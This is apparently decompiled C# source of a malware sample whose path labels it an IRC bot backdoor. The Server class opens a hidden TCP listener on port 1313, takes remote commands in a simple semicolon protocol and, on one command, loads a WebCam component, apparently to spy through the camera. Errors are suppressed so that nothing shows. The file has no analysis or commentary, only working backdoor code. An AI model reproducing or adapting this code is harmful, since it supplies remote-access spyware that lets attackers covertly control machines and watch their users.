// Decompiled with JetBrains decompiler
// Type: Irc9.Server
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Irc9
{
  public class Server
  {
    private static string host;
    private static Socket listener;
    private static Socket[] m_workerSocket = new Socket[10];
    public static AsyncCallback pfnWorkerCallBack;
    private static int m_clientCount = 0;
    private static WebCam webCam;

    public static void ServerSock()
    {
      try
      {
        byte[] numArray = new byte[1024];
        IPEndPoint localEP = new IPEndPoint(IPAddress.Any, 1313);
        Server.listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        Server.listener.Bind((EndPoint) localEP);
        Server.listener.Listen(10);
        Server.listener.BeginAccept(new AsyncCallback(Server.AcceptCallback), (object) Server.listener);
      }
      catch (Exception ex)
      {
      }
    }

    public static void AcceptCallback(IAsyncResult ar)
    {
      Socket socket = ((Socket) ar.AsyncState).EndAccept(ar);
      StateObject state = new StateObject();
      state.workSocket = socket;
      socket.BeginReceive(state.buffer, 0, 1024, SocketFlags.None, new AsyncCallback(Server.ReadCallback), (object) state);
    }

    public static void ReadCallback(IAsyncResult ar)
    {
      try
      {
        string empty = string.Empty;
        StateObject asyncState = (StateObject) ar.AsyncState;
        Socket workSocket = asyncState.workSocket;
        int count = workSocket.EndReceive(ar);
        if (count > 0)
        {
          asyncState.sb.Append(Encoding.ASCII.GetString(asyncState.buffer, 0, count));
          string data = asyncState.sb.ToString();
          Server.RecvCommand(workSocket, data);
        }
        workSocket.BeginReceive(asyncState.buffer, 0, 1024, SocketFlags.None, new AsyncCallback(Server.ReadCallback), (object) asyncState);
      }
      catch
      {
      }
    }

    private static bool SendCommand(
      Socket pSocket,
      string Command,
      string Option1,
      string Option2,
      long NextRecieveLen)
    {
      if (Option1 == null)
        Option2 = "0000";
      if (Option2 == null)
        Option2 = "0000";
      if (NextRecieveLen == 0L)
        NextRecieveLen = long.Parse("000000000");
      string str = Command + ";" + Option1 + ";" + Option2 + ";";
      for (int index = 0; (long) index <= NextRecieveLen; ++index)
        str += "0";
      Server.Send(pSocket, str + (object) NextRecieveLen);
      return true;
    }

    private static void Send(Socket handler, string data)
    {
      byte[] bytes = Encoding.ASCII.GetBytes(data);
      handler.BeginSend(bytes, 0, bytes.Length, SocketFlags.None, new AsyncCallback(Server.SendCallback), (object) handler);
    }

    private static void SendCallback(IAsyncResult ar)
    {
      try
      {
        Socket asyncState = (Socket) ar.AsyncState;
        Console.WriteLine("Sent {0} bytes to client.", (object) asyncState.EndSend(ar));
        asyncState.Shutdown(SocketShutdown.Both);
        asyncState.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
      }
    }

    public static void RecvCommand(Socket sendSocket, string data)
    {
      string[] strArray = data.Split(';');
      string str1 = strArray[0];
      string str2 = strArray[1];
      string str3 = strArray[2];
      long.Parse(strArray[3]);
      if (!(str1 == "WEBC") || !(str2 == "DEVC") || !(str3 == "GETA"))
        return;
      Server.webCam = new WebCam();
      Server.webCam.Load();
    }
  }
}
